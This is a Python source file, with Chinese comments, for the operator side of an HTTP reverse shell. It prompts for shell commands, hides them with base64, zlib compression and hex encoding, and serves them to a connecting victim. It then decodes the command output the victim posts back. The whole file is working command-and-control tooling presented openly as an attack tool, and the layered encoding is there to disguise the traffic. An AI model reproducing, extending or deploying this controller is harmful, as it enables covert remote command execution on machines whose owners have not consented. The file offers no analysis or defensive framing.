#coding=utf-8

import http.server
import argparse
import base64
import binascii
import zlib

class MyHandler(http.server.BaseHTTPRequestHandler): # 接收 GET/POST

    def do_GET(self):

        command = input("Shell> ")
        command_en = command.encode('utf-8')
        command_en = base64.b64encode(command_en) # base64 编码
        command_en = zlib.compress(command_en) # zlib 压缩
        command_en = binascii.b2a_hex(command_en) # 字节转 ascii 再 Hex 编码
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command_en)

    def do_POST(self):

        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length']) #定义数据长度
        postVar = self.rfile.read(length)
        result = binascii.a2b_hex(postVar) 
        result = zlib.decompress(result)
        result = base64.b64decode(result)
        print(result.decode('utf-8'))

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Python3 HTTP Reverse Shell')
    parser.add_argument('host', help=' interface the server listens at;')
    parser.add_argument('port', type=int, default=8000, help='tcp port')
    args = parser.parse_args()
    if args.host:
        # 创建对象
        server_class = http.server.HTTPServer
        httpd = server_class((args.host, args.port), MyHandler)

    try:
        httpd.serve_forever() # 开启服务
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()
